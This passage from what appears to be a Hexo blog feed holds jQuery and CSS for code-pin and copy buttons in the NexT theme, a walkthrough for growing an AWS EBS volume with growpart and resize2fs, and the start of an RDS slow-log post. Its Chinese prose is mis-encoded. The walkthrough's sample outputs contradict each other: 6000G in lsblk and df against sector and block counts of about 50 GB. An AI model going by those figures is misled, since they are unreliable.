class="string">"block"</span>, <span class="number">1</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">"img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_red.png"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $(figure).attr(<span class="string">"block"</span>, <span class="number">0</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">"img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_green.png"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$(<span class="string">"figure"</span>).unbind(<span class="string">"dblclick"</span>).bind(<span class="string">"dblclick"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">//åŒå‡»äº‹ä»¶</span></div><div class="line">    <span class="keyword">var</span> block = $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>);</div><div class="line">    <span class="keyword">if</span> (block != <span class="number">1</span>) &#123;</div><div class="line">        $(<span class="string">".post-body"</span>).css(<span class="string">"transform"</span>, <span class="string">"none"</span>);</div><div class="line">        $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>, <span class="number">1</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_red.png"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>, <span class="number">0</span>);</div><div class="line">        $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn img"</span>).attr(<span class="string">"src"</span>, <span class="string">"/article_images/png/Pin_green.png"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;)</div><div class="line"></div><div class="line">$(<span class="built_in">window</span>).resize(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> block;</div><div class="line">    <span class="keyword">var</span> width_Main = $(<span class="string">"#main"</span>).width();</div><div class="line">    <span class="keyword">var</span> width_Base = $(<span class="string">".main-inner"</span>).width();</div><div class="line">    <span class="keyword">var</span> width_Blank = (width_Main - width_Base) / <span class="number">2</span> - <span class="number">10</span>;</div><div class="line">    $copyBtn = $(<span class="string">"#copyBtn"</span>);</div><div class="line">    <span class="keyword">if</span> (width_Blank &lt; $copyBtn.width()) &#123;</div><div class="line">        $copyBtn.css(<span class="string">"display"</span>, <span class="string">"none"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $copyBtn.css(<span class="string">"display"</span>, <span class="string">"block"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $(<span class="string">"figure[block='1']"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">        block = $(<span class="keyword">this</span>).attr(<span class="string">"block"</span>);</div><div class="line">        <span class="keyword">if</span> (block == <span class="number">1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> width_This = $(<span class="keyword">this</span>).width();</div><div class="line">            <span class="keyword">var</span> width_Scroll = $(<span class="keyword">this</span>)[<span class="number">0</span>].scrollWidth;</div><div class="line">            <span class="keyword">var</span> width_Margin = -<span class="built_in">parseInt</span>($(<span class="keyword">this</span>).css(<span class="string">"marginRight"</span>));</div><div class="line"></div><div class="line">            <span class="keyword">var</span> width_Hide = width_Scroll - (width_This - width_Margin);</div><div class="line">            <span class="keyword">if</span> (width_Hide &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="comment">//var width_Main  = $("#main").width();</span></div><div class="line">                <span class="comment">//var width_Base  = $(".main-inner").width();</span></div><div class="line">                <span class="comment">//width_Blank = (width_Main - width_Base) / 2 - 10;</span></div><div class="line"></div><div class="line">                <span class="keyword">if</span> (width_Blank &gt; <span class="number">0</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (width_Hide &lt; width_Blank) &#123;</div><div class="line">                        width_Margin = width_Hide; <span class="comment">//ç©ºç™½åŒºåŸŸè¶³å¤Ÿç›´æ¥æ˜¾ç¤º å…¨éƒ¨</span></div><div class="line">                    &#125; <span class="keyword">else</span> &#123;</div><div class="line">                        width_Margin = width_Blank * <span class="number">0.8</span>;</div><div class="line">                    &#125;</div><div class="line">                    $(<span class="keyword">this</span>).css(&#123;</div><div class="line">                        marginRight: -width_Margin</div><div class="line">                    &#125;);</div><div class="line">                    $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn"</span>).animate(&#123;</div><div class="line">                        opacity: <span class="number">1</span>,</div><div class="line">                        left: $(<span class="string">".post-body"</span>)[<span class="number">0</span>].getBoundingClientRect().right + width_Margin - $(<span class="keyword">this</span>).find(<span class="string">".codePinBtn"</span>).width()</div><div class="line">                    &#125;);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    createCopyBtns();</div><div class="line">    $(<span class="string">".codePinBtn"</span>).unbind(<span class="string">"click"</span>).bind(<span class="string">"click"</span>, btnPinClick);</div><div class="line">&#125;);</div></pre></div></div></figure><hr><h1 id="0x02-æ·»åŠ è‡ªåŠ¨æ”¹å˜ä»£ç ç‰‡æ®µjs"><a href="#0x02-æ·»åŠ è‡ªåŠ¨æ”¹å˜ä»£ç ç‰‡æ®µjs" class="headerlink" title="0x02 æ·»åŠ è‡ªåŠ¨æ”¹å˜ä»£ç ç‰‡æ®µjs"></a>0x02 æ·»åŠ è‡ªåŠ¨æ”¹å˜ä»£ç ç‰‡æ®µjs</h1><blockquote><p>./themes/next/source/js/src/function.js <code>æ–°å¢</code></p></blockquote><figure class="highlight js"><figcaption><span class="fileDir">./themes/next/source/js/src/</span><span class="caption">function</span><span class="suffix">.js</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></div><div class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClass</span>(<span class="params">tagName, className</span>) //è·å¾—æ ‡ç­¾åä¸º<span class="title">tagName</span>,ç±»å<span class="title">className</span>çš„å…ƒç´ </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.getElementsByClassName) <span class="comment">//æ”¯æŒè¿™ä¸ªå‡½æ•°</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementsByClassName(className);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">var</span> tags = <span class="built_in">document</span>.getElementsByTagName(tagName); <span class="comment">//è·å–æ ‡ç­¾</span></div><div class="line">        <span class="keyword">var</span> tagArr = []; <span class="comment">//ç”¨äºè¿”å›ç±»åä¸ºclassNameçš„å…ƒç´ </span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tags.length; i++) &#123;</div><div class="line">            <span class="keyword">if</span> (tags[i].class == className) &#123;</div><div class="line">                tagArr[tagArr.length] = tags[i]; <span class="comment">//ä¿å­˜æ»¡è¶³æ¡ä»¶çš„å…ƒç´ </span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> tagArr;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEvent</span>(<span class="params">obj, type, fn</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (obj.addEventListener) obj.addEventListener(type, fn, <span class="literal">false</span>);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj.attachEvent) obj.attachEvent(<span class="string">'on'</span> + type, fn);</div><div class="line">    <span class="keyword">else</span> obj[<span class="string">'on'</span> + type] = fn;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeEvent</span>(<span class="params">obj, type, fn</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (obj.removeEventListener) obj.removeEventListener(type, fn, <span class="literal">false</span>);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj.detachEvent) obj.detachEvent(<span class="string">'on'</span> + type, fn);</div><div class="line">    <span class="keyword">else</span> obj[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">resizePos</span>(<span class="params">obj, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback == <span class="string">"function"</span>) &#123;</div><div class="line">        addEvent(<span class="built_in">window</span>, <span class="string">'scroll'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            callback(obj);</div><div class="line">        &#125;);</div><div class="line">        addEvent(<span class="built_in">window</span>, <span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            callback(obj);</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBrowser</span>(<span class="params">getVersion</span>) </span>&#123;</div><div class="line">    <span class="comment">//æ³¨æ„å…³é”®å­—å¤§å°å†™</span></div><div class="line">    <span class="keyword">var</span> ua_str = navigator.userAgent.toLowerCase(),</div><div class="line">        ie_Tridents, trident, match_str, ie_aer_rv, browser_chi_Type;</div><div class="line"></div><div class="line">    <span class="comment">//åˆ¤æ–­IE æµè§ˆå™¨,</span></div><div class="line">    <span class="comment">//blog: http://blog.csdn.Net/aerchi/article/details/51697592</span></div><div class="line">    <span class="keyword">if</span> (<span class="string">"ActiveXObject"</span> <span class="keyword">in</span> self) &#123;</div><div class="line">        <span class="comment">// ie_aer_rv:  æŒ‡ç¤ºIE çš„ç‰ˆæœ¬.</span></div><div class="line">        <span class="comment">// It can be affected by the current document mode of IE.</span></div><div class="line">        ie_aer_rv = (match_str = ua_str.match(<span class="regexp">/msie ([\d.]+)/</span>)) ? match_str[<span class="number">1</span>] :</div><div class="line">            (match_str = ua_str.match(<span class="regexp">/rv:([\d.]+)/</span>)) ? match_str[<span class="number">1</span>] : <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="comment">// ie: Indicate the really version of current IE browser.</span></div><div class="line">        ie_Tridents = &#123; <span class="string">"trident/7.0"</span>: <span class="number">11</span>, <span class="string">"trident/6.0"</span>: <span class="number">10</span>, <span class="string">"trident/5.0"</span>: <span class="number">9</span>, <span class="string">"trident/4.0"</span>: <span class="number">8</span> &#125;;</div><div class="line">        <span class="comment">//åŒ¹é… ie8, ie11, edge</span></div><div class="line">        trident = (match_str = ua_str.match(<span class="regexp">/(trident\/[\d.]+|edge\/[\d.]+)/</span>)) ? match_str[<span class="number">1</span>] : <span class="literal">undefined</span>;</div><div class="line">        browser_chi_Type = (ie_Tridents[trident] || ie_aer_rv) &gt; <span class="number">0</span> ? <span class="string">"internet-explorer"</span> : <span class="literal">undefined</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">//åˆ¤æ–­ windows edge æµè§ˆå™¨</span></div><div class="line">        <span class="comment">// match_str[1]: è¿”å›æµè§ˆå™¨åŠç‰ˆæœ¬å·,å¦‚: "edge/13.10586"</span></div><div class="line">        <span class="comment">// match_str[1]: è¿”å›ç‰ˆæœ¬å·,å¦‚: "edge"</span></div><div class="line">        <span class="comment">//è‹¥è¦è¿”å› "edge" è¯·æŠŠä¸‹è¡Œçš„ "ie" æ¢æˆ "edge"ã€‚ æ³¨æ„å¼•å·åŠå†’å·æ˜¯è‹±æ–‡çŠ¶æ€ä¸‹è¾“å…¥çš„</span></div><div class="line">        browser_chi_Type = (match_str = ua_str.match(<span class="regexp">/edge\/([\d.]+)/</span>)) ? <span class="string">"edge"</span> :</div><div class="line">            <span class="comment">//åˆ¤æ–­firefox æµè§ˆå™¨</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/firefox\/([\d.]+)/</span>)) ? <span class="string">"firefox"</span> :</div><div class="line">            <span class="comment">//åˆ¤æ–­chrome æµè§ˆå™¨</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/chrome\/([\d.]+)/</span>)) ? <span class="string">"chrome"</span> :</div><div class="line">            <span class="comment">//åˆ¤æ–­opera æµè§ˆå™¨</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/opera.([\d.]+)/</span>)) ? <span class="string">"opera"</span> :</div><div class="line">            <span class="comment">//åˆ¤æ–­safari æµè§ˆå™¨</span></div><div class="line">            (match_str = ua_str.match(<span class="regexp">/version\/([\d.]+).*safari/</span>)) ? <span class="string">"safari"</span> : <span class="literal">undefined</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//è¿”å›æµè§ˆå™¨ç±»å‹å’Œç‰ˆæœ¬å·</span></div><div class="line">    <span class="keyword">var</span> verNum, verStr;</div><div class="line">    verNum = trident &amp;&amp; ie_Tridents[trident] ? ie_Tridents[trident] : match_str[<span class="number">1</span>];</div><div class="line">    verStr = (getVersion != <span class="literal">undefined</span>) ? browser_chi_Type + <span class="string">"/"</span> + verNum : browser_chi_Type;</div><div class="line">    <span class="keyword">return</span> verStr;</div><div class="line">&#125;</div></pre></div></div></figure><hr><h1 id="0x03-æ’å…¥åˆ°ä¸»é¢˜"><a href="#0x03-æ’å…¥åˆ°ä¸»é¢˜" class="headerlink" title="0x03 æ’å…¥åˆ°ä¸»é¢˜"></a>0x03 æ’å…¥åˆ°ä¸»é¢˜</h1><p>æ–°å»ºæ–‡ä»¶ <code>custom.swig</code> ï¼Œç›®å½•å¦‚ä¸‹ï¼šï¼ˆç›¸å¯¹ç›®å½•ä¸ºå·¥ç¨‹ç›®å½•ï¼‰</p><blockquote><p>./themes/next/layout_custom/custom.swig <code>æ–°å¢</code></p></blockquote><figure class="highlight js"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/function.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/lib/zclip/clipboard.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/custom.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></div></div></figure><p>ä¿®æ”¹æ–‡ä»¶ _layout.swig ï¼Œç›®å½•å¦‚ä¸‹ï¼šï¼ˆç›¸å¯¹ç›®å½•ä¸ºå·¥ç¨‹ç›®å½•ï¼‰</p><blockquote><p>./themes/next/layout/_layout.swig <code>ä¿®æ”¹</code></p></blockquote><figure class="highlight html"><figcaption><span class="fileDir">./themes/next/layout/</span><span class="caption">_layout</span><span class="suffix">.swig</span></figcaption><div class="figcode"><div class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">class</span>=<span class="string">"&#123;&#123; html_class | lower &#125;&#125;"</span> <span class="attr">lang</span>=<span class="string">"&#123;&#123; config.language &#125;&#125;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">"http://schema.org/WebPage"</span> <span class="attr">lang</span>=<span class="string">"&#123;&#123; page.lang || page.language || config.language &#125;&#125;"</span>&gt;</span></div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    &#123;% include '_third-party/mathjax.swig' %&#125;</div><div class="line">    &#123;% include '_third-party/scroll-cookie.swig' %&#125;</div><div class="line">    &#123;% include '_third-party/exturl.swig' %&#125;</div><div class="line diff-addition">    &#123;% include '_custom/custom.swig' %&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></div></div></figure><hr><h1 id="0x04-æ›´æ”¹button"><a href="#0x04-æ›´æ”¹button" class="headerlink" title="0x04 æ›´æ”¹button"></a>0x04 æ›´æ”¹button</h1><blockquote><p>./themes/next/source/css/_custom/button.styl <code>æ–°å¢</code></p></blockquote><figure class="highlight css"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"><span class="selector-class">.codePinBtn</span>&#123;</div><div class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> auto;</div><div class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">z-index</span>: <span class="number">1000</span>;</div><div class="line">  <span class="attribute">margin-left</span>: -<span class="number">23px</span>;</div><div class="line">  <span class="attribute">align-self</span>: start;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-id">#copyBtn</span> &#123;</div><div class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">position</span>: fixed;</div><div class="line">    <span class="attribute">display</span>: block;</div><div class="line">    <span class="attribute">z-index</span>: <span class="number">1000</span>;</div><div class="line">    <span class="attribute">line-height</span>: <span class="number">1</span>;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">1.5em</span>;</div><div class="line">    <span class="attribute">left</span>: <span class="number">18px</span>;</div><div class="line">&#125;</div></pre></div></div></figure><blockquote><p>./themes/next/source/css/_custom/custom.styl <code>ä¿®æ”¹</code></p></blockquote><figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">...</div><div class="line">@import button;</div></pre></div></div></figure><p>æ·»åŠ ä»£ç æ‹‰ä¼¸æ§åˆ¶buttonæ–‡ä»¶<img src="https://kionf.com/article_images/png/Pin_green.png" alt="green"><img src="https://kionf.com/article_images/png/Pin_red.png" alt="red"></p><hr><p>å‰©ä¸‹çš„è‡ªå·±é¼“æ£</p><div class="note success"><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" title="ç¥å™¨" target="_blank" rel="noopener">ç¥å™¨</a></p></div>]]></content>
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> next </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AWS EC2 ç£ç›˜EBSæ‰©å®¹</title>
      <link href="/2017/11/15/linux-aws-ebs/"/>
      <url>/2017/11/15/linux-aws-ebs/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>5minä¸åœæœºæ‰©å®¹EBSå·å¤§å°</p></blockquote><a id="more"></a><h1 id="0x00-å¢åŠ ç£ç›˜å¤§å°"><a href="#0x00-å¢åŠ ç£ç›˜å¤§å°" class="headerlink" title="0x00 å¢åŠ ç£ç›˜å¤§å°"></a>0x00 å¢åŠ ç£ç›˜å¤§å°</h1><h2 id="1-åœ¨ec2å®ä¾‹ç•Œé¢é€‰æ‹©ç›¸åº”éœ€è¦æ‰©å®¹ç£ç›˜çš„å®ä¾‹ï¼Œé€‰æ‹©è¦æ‰©å®¹çš„ç£ç›˜"><a href="#1-åœ¨ec2å®ä¾‹ç•Œé¢é€‰æ‹©ç›¸åº”éœ€è¦æ‰©å®¹ç£ç›˜çš„å®ä¾‹ï¼Œé€‰æ‹©è¦æ‰©å®¹çš„ç£ç›˜" class="headerlink" title="1. åœ¨ec2å®ä¾‹ç•Œé¢é€‰æ‹©ç›¸åº”éœ€è¦æ‰©å®¹ç£ç›˜çš„å®ä¾‹ï¼Œé€‰æ‹©è¦æ‰©å®¹çš„ç£ç›˜"></a>1. åœ¨ec2å®ä¾‹ç•Œé¢é€‰æ‹©ç›¸åº”éœ€è¦æ‰©å®¹ç£ç›˜çš„å®ä¾‹ï¼Œé€‰æ‹©è¦æ‰©å®¹çš„ç£ç›˜</h2><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-1.png" alt="kionf"></p><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-2.png" alt="kionf"></p><h2 id="2-ä¿®æ”¹å·å¤§å°"><a href="#2-ä¿®æ”¹å·å¤§å°" class="headerlink" title="2. ä¿®æ”¹å·å¤§å°"></a>2. ä¿®æ”¹å·å¤§å°</h2><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-3.png" alt="kionf">    </p><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-4.png" alt="kionf">    </p><h2 id="3-ç¡®è®¤"><a href="#3-ç¡®è®¤" class="headerlink" title="3. ç¡®è®¤"></a>3. ç¡®è®¤</h2><p>æ˜¾ç¤ºè¿›åº¦ï¼Œç­‰å¾…åº”ç”¨é…ç½®å®Œæˆï¼Œéœ€è¦å‡ åˆ†é’Ÿè€å¿ƒç­‰å¾…â€¦.</p><p><img src="https://kionf.com/article_images/aws-ebs/aws-ebs-5.png" alt="kionf">    </p><h1 id="0x01-æ‰©å®¹ç£ç›˜"><a href="#0x01-æ‰©å®¹ç£ç›˜" class="headerlink" title="0x01 æ‰©å®¹ç£ç›˜"></a>0x01 æ‰©å®¹ç£ç›˜</h1><p><strong>å®‰è£…æ‰©å®¹å·¥å…·</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">yum install cloud-init cloud-utils-growpart gdisk</div></pre></div></div></figure><p>ç­‰å¾…ebså·å¤§å°è°ƒæ•´å®Œæˆåï¼Œåœ¨æ‰©å®¹çš„å®ä¾‹ä¸­æ‰§è¡Œlsblkåˆ—å‡ºè¿æ¥åˆ°å®ä¾‹çš„EBSè®¾å¤‡</p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">[root@ttt] #: lsblk</div><div class="line">NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</div><div class="line">xvda    202:0    0  6000G  0 disk </div><div class="line">â””â”€xvda1 202:1    0  20G  0 part /</div></pre></div></div></figure><p>ä½¿ç”¨ df -h æŸ¥çœ‹ï¼Œ/dev/xvda1 è®¾å¤‡å·²æ‰©å±•ä¸º 6000 GiBï¼Œä½†æ“ä½œç³»ç»Ÿä»åªèƒ½çœ‹åˆ°åŸæ¥çš„ 20 GiB ext4 æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: df -h</span></div><div class="line">æ–‡ä»¶ç³»ç»Ÿ                       å®¹é‡  å·²ç”¨  å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹</div><div class="line">devtmpfs                       3.9G   64K  3.9G    1% /dev</div><div class="line">tmpfs                          3.9G     0  3.9G    0% /dev/shm</div><div class="line">/dev/xvda1                      20G   12G  8.2G   59% /</div></pre></div></div></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨<code>growpart</code>å±•å¼€ä¿®æ”¹åçš„åˆ†åŒº<strong>ï¼ˆæ³¨æ„å°†è®¾å¤‡åç§°ä¸åˆ†åŒºåç§°åˆ†éš”å¼€ï¼‰</strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: growpart /dev/xvda 1</span></div><div class="line">CHANGED: disk=/dev/xvda partition=1: start=4096 old: size=41938910,end=41943006 new: size=104853470,end=104857566</div></pre></div></div></figure><p>é€šè¿‡æŸ¥çœ‹<code>lsblk</code>å¯ä»¥ç¡®è®¤åˆ†åŒº<code>/dev/xvda1</code>ç°å·²å¡«å……å·<code>/dev/xvda</code>ä¸Šçš„å¯ç”¨ç©ºé—´ï¼š</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: lsblk</span></div><div class="line">NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</div><div class="line">xvda    202:0    0  6000G  0 disk </div><div class="line">â””â”€xvda1 202:1    0  6000G  0 part /</div></pre></div></div></figure><p>å¯¹äº Linux ext2ã€ext3 æˆ– ext4 æ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¹¶æ›¿æ¢è¦æ‰©å±•çš„è®¾å¤‡åç§°ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@ttt] #: resize2fs /dev/xvda1</div><div class="line">resize2fs 1.42.12 (29-Aug-2014)</div><div class="line">Filesystem at /dev/xvda1 is mounted on /; on-line resizing required</div><div class="line">old_desc_blocks = 2, new_desc_blocks = 4</div><div class="line">The filesystem on /dev/xvda1 is now 13106683 (4k) blocks long.</div></pre></div></div></figure><h1 id="0x02-å®Œæˆæ‰©å®¹"><a href="#0x02-å®Œæˆæ‰©å®¹" class="headerlink" title="0x02 å®Œæˆæ‰©å®¹"></a>0x02 å®Œæˆæ‰©å®¹</h1><p>è‡³æ­¤ï¼Œç£ç›˜å·²å®Œæˆæ‰©å®¹ï¼ŒæŸ¥çœ‹ç£ç›˜å¯ç”¨ç©ºé—´ï¼š</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[root@ttt] <span class="comment">#: df -h</span></div><div class="line">æ–‡ä»¶ç³»ç»Ÿ                       å®¹é‡  å·²ç”¨  å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹</div><div class="line">devtmpfs                       3.9G   64K  3.9G    1% /dev</div><div class="line">tmpfs                          3.9G     0  3.9G    0% /dev/shm</div><div class="line">/dev/xvda1                      6000G   12G  5988.2G   0.002% /</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> è‡ªåŠ¨åŒ–è¿ç»´ </category>
          
          <category> AWS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>awsä¸ŠRDSæ•°æ®åº“å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—</title>
      <link href="/2017/11/08/mysql-slowlog/"/>
      <url>/2017/11/08/mysql-slowlog/</url>
